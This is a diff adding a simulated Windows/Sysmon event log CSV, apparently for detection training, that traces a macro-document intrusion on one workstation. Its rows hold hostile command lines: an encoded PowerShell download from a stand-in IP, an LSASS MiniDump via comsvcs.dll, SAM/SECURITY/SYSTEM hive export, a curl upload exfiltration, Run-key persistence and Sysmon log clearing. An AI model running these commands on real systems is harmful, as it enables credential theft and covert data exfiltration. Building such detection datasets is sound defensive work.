@@ -1,0 +1,38 @@
+_time,EventCode,ComputerName,User,ProcessName,ParentProcessName,ProcessId,ParentProcessId,TargetProcessName,GrantedAccess,CommandLine,TargetFilename,DestinationIp,DestinationPort,QueryName,RegistryKey,Hashes,Details
+2026-10-14 09:50:04,4688,HR-WKSTN-05,NT AUTHORITY\SYSTEM,svchost.exe,services.exe,712,580,,,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,,,,,,,Routine scheduled-task service process
+2026-10-14 09:55:10,4688,HR-WKSTN-05,HR-WKSTN-05\s.patel,chrome.exe,explorer.exe,3012,1804,,,C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,User browser launch
+2026-10-14 09:55:12,3,HR-WKSTN-05,HR-WKSTN-05\s.patel,chrome.exe,,3012,,,,,,142.250.190.45,443,,,,Benign-looking HTTPS connection; validate context
+2026-10-14 09:58:30,10,HR-WKSTN-05,NT AUTHORITY\SYSTEM,svchost.exe,services.exe,1550,800,lsass.exe,0x1000,,,,,,,,Baseline LSASS access; validate source process
+2026-10-14 09:59:10,22,HR-WKSTN-05,HR-WKSTN-05\s.patel,chrome.exe,,3012,,,,,,,,,www.google.com,,Normal-looking DNS query
+2026-10-14 10:00:00,11,HR-WKSTN-05,HR-WKSTN-05\s.patel,OUTLOOK.EXE,explorer.exe,2100,1804,,,,C:\Users\s.patel\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\Q4_Salary_Adjustments.docm,,,,,,Office attachment written to Outlook cache
+2026-10-14 10:00:45,4688,HR-WKSTN-05,HR-WKSTN-05\s.patel,WINWORD.EXE,explorer.exe,4800,1804,,,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE /n C:\Users\s.patel\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\Q4_Salary_Adjustments.docm,,,,,,Office document opened by user,
+2026-10-14 10:00:52,4688,HR-WKSTN-05,HR-WKSTN-05\s.patel,powershell.exe,WINWORD.EXE,5200,4800,,,powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGh0dHA6Ly8xOTguNTEuMTAwLjk5OjgwL3VwZGF0ZV9zZXJ2aWNlLmV4ZSAtT3V0RmlsZSBDOlxVc2Vyc1xzLnBhdGVsXEFwcERhdGFcTG9jYWxcVGVtcFx1cGRhdGVfc2VydmljZS5leGU=,,,,,,Encoded PowerShell; decode during investigation,
+2026-10-14 10:00:53,22,HR-WKSTN-05,HR-WKSTN-05\s.patel,powershell.exe,,5200,,,,,,,,,198.51.100.99,,DNS query for simulated documentation-range host
+2026-10-14 10:00:55,3,HR-WKSTN-05,HR-WKSTN-05\s.patel,powershell.exe,,5200,,,,,,198.51.100.99,80,,,,Outbound HTTP connection from PowerShell
+2026-10-14 10:00:58,11,HR-WKSTN-05,HR-WKSTN-05\s.patel,powershell.exe,,5200,,,,,C:\Users\s.patel\AppData\Local\Temp\update_service.exe,,,,,SHA256=7A6F0B7E0A2F6D8C2D4A9B1E3F5C7D9A1B2C3D4E5F60718293A4B5C6D7E8F901,Illustrative lab hash; not a real reputation claim
+2026-10-14 10:01:00,4688,HR-WKSTN-05,HR-WKSTN-05\s.patel,update_service.exe,powershell.exe,6100,5200,,,C:\Users\s.patel\AppData\Local\Temp\update_service.exe,,,,,,,New executable launched by PowerShell
+2026-10-14 10:01:05,3,HR-WKSTN-05,HR-WKSTN-05\s.patel,update_service.exe,,6100,,,,,,198.51.100.99,443,,,,Executable makes outbound HTTPS connection
+2026-10-14 10:01:07,22,HR-WKSTN-05,HR-WKSTN-05\s.patel,update_service.exe,,6100,,,,,,,,,updates.example.test,,Simulated DNS lookup; reserved example domain
+2026-10-14 10:02:00,4688,HR-WKSTN-05,HR-WKSTN-05\s.patel,rundll32.exe,update_service.exe,7200,6100,,,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 880 C:\Windows\Temp\lsass_backup.dmp full",,,,,,,Suspicious LOLBin command referencing MiniDump
+2026-10-14 10:02:02,10,HR-WKSTN-05,HR-WKSTN-05\s.patel,rundll32.exe,update_service.exe,7200,6100,lsass.exe,0x1fffff,,,,,,,,Broad LSASS access; highly suspicious in this context
+2026-10-14 10:02:05,11,HR-WKSTN-05,HR-WKSTN-05\s.patel,rundll32.exe,,7200,,,,,C:\Windows\Temp\lsass_backup.dmp,,,,,,Dump-file creation corroborates credential-dumping hypothesis
+2026-10-14 10:02:30,4688,HR-WKSTN-05,HR-WKSTN-05\s.patel,reg.exe,update_service.exe,7300,6100,,,reg.exe save HKLM\SECURITY C:\Windows\Temp\security.hiv /y,,,,,,,Suspicious registry hive export
+2026-10-14 10:02:32,11,HR-WKSTN-05,HR-WKSTN-05\s.patel,reg.exe,,7300,,,,,C:\Windows\Temp\security.hiv,,,,,,Registry hive file created
+2026-10-14 10:02:35,4688,HR-WKSTN-05,HR-WKSTN-05\s.patel,reg.exe,update_service.exe,7350,6100,,,reg.exe save HKLM\SAM C:\Windows\Temp\sam.hiv /y,,,,,,Potential credential database hive collection,
+2026-10-14 10:02:37,11,HR-WKSTN-05,HR-WKSTN-05\s.patel,reg.exe,,7350,,,,,C:\Windows\Temp\sam.hiv,,,,,,SAM hive file created
+2026-10-14 10:02:40,4688,HR-WKSTN-05,HR-WKSTN-05\s.patel,reg.exe,update_service.exe,7400,6100,,,reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.hiv /y,,,,,,Potential credential-related hive collection,
+2026-10-14 10:02:42,11,HR-WKSTN-05,HR-WKSTN-05\s.patel,reg.exe,,7400,,,,,C:\Windows\Temp\system.hiv,,,,,,SYSTEM hive file created
+2026-10-14 10:03:10,4688,HR-WKSTN-05,HR-WKSTN-05\s.patel,makecab.exe,update_service.exe,7500,6100,,,makecab.exe C:\Windows\Temp\lsass_backup.dmp C:\Windows\Temp\diagnostic_bundle.cab,,,,,,,Archive staging event
+2026-10-14 10:03:15,11,HR-WKSTN-05,HR-WKSTN-05\s.patel,makecab.exe,,7500,,,,,C:\Windows\Temp\diagnostic_bundle.cab,,,,,,Archive created
+2026-10-14 10:03:20,3,HR-WKSTN-05,HR-WKSTN-05\s.patel,curl.exe,,7600,,,,,,198.51.100.99,8443,,,,Outbound connection associated with simulated exfiltration
+2026-10-14 10:03:21,4688,HR-WKSTN-05,HR-WKSTN-05\s.patel,curl.exe,update_service.exe,7600,6100,,,"curl.exe -X POST -F ""file=@C:\Windows\Temp\diagnostic_bundle.cab"" http://198.51.100.99:8443/upload",,,,,,,Command suggests upload attempt; does not prove transfer succeeded
+2026-10-14 10:04:00,13,HR-WKSTN-05,HR-WKSTN-05\s.patel,update_service.exe,,6100,,,,,,,,,HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdateService,,Persistence-like Run key value set; simulated registry telemetry
+2026-10-14 10:04:02,4688,HR-WKSTN-05,HR-WKSTN-05\s.patel,reg.exe,update_service.exe,7700,6100,,,"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v UpdateService /t REG_SZ /d ""C:\Users\s.patel\AppData\Local\Temp\update_service.exe"" /f",,,,,,,Run-key persistence command
+2026-10-14 10:05:00,4688,HR-WKSTN-05,HR-WKSTN-05\s.patel,cmd.exe,update_service.exe,7800,6100,,,cmd.exe /c del /f /q C:\Windows\Temp\lsass_backup.dmp C:\Windows\Temp\*.hiv C:\Windows\Temp\diagnostic_bundle.cab,,,,,,,Attempted cleanup of dump and staged files
+2026-10-14 10:05:05,4688,HR-WKSTN-05,HR-WKSTN-05\s.patel,wevtutil.exe,cmd.exe,7900,7800,,,wevtutil cl Microsoft-Windows-Sysmon/Operational,,,,,,,Attempt to clear Sysmon Operational log
+2026-10-14 10:05:20,10,HR-WKSTN-05,NT AUTHORITY\\SYSTEM,MsMpEng.exe,services.exe,1250,800,lsass.exe,0x1410,,,,,,,,Potentially legitimate Defender access; validate context
+2026-10-14 10:05:35,4688,HR-WKSTN-05,HR-WKSTN-05\s.patel,notepad.exe,explorer.exe,7340,1804,,,C:\Windows\System32\notepad.exe,,,,,,,Benign user process for comparison
+2026-10-14 10:06:00,22,HR-WKSTN-05,HR-WKSTN-05\s.patel,update_service.exe,,6100,,,,,,,,,fileserver.example.test,,Simulated internal host discovery DNS query
+2026-10-14 10:06:05,3,HR-WKSTN-05,HR-WKSTN-05\s.patel,update_service.exe,,6100,,,,,,203.0.113.25,445,,,,Simulated SMB connection attempt to documentation-range IP
+2026-10-14 10:06:10,4688,HR-WKSTN-05,HR-WKSTN-05\s.patel,whoami.exe,update_service.exe,8000,6100,,,whoami.exe /all,,,,,,,Discovery command
+2026-10-14 10:06:15,4688,HR-WKSTN-05,HR-WKSTN-05\s.patel,ipconfig.exe,update_service.exe,8010,6100,,,ipconfig.exe /all,,,,,,,Host and network discovery command
